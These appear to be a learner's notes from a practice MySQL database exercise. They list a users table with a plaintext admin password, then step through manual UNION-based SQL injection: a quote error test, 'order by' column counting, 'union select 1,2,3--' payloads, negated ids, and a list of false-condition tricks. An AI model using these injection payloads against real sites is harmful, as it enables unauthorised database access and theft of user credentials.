database: c9
table: pages
    id      INT(6)
    content VARCHAR(100)
table: users
    id       INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY
    login    VARCHAR(30)
    password VARCHAR(30)
    
show tables;
INSERT INTO users VALUES (1, 'admin', '12345678');
select * from users;
DELETE FROM pages WHERE content = 'Contacts page';

update pages set content='<style>body{background-color:blue;}</style>' where id=1;



// Results
1. id=1' ( Error, so can MYSQL injection )
2. id=1 order by 3-- ( no error )
   id=1 order by 4-- ( Error )
   So in our table we have 3 columns
3. Union select statement. It joins the previously running query to itself
Usage: union select 1,2,3,... till no of columns
In our case union select 1,2,3--
its case insensitive
our query is becoming: SELECT * FROM users WHERE id=1 union select 1,2,3--

Page loads fine)
and when union select is called we can should see some columns no. to execute MySQL queries
for than we could False / NULL the query by negativing the value
Our query: SELECT * FROM users WHERE id=-1 union select 1,2,3--
Now we see column no. 2 . So username is storage at column 2
other methods:
- id=1 and 0
- and false
- and 1=2
- and 0/0
- having 1=2
- 0
- 9999999
- null
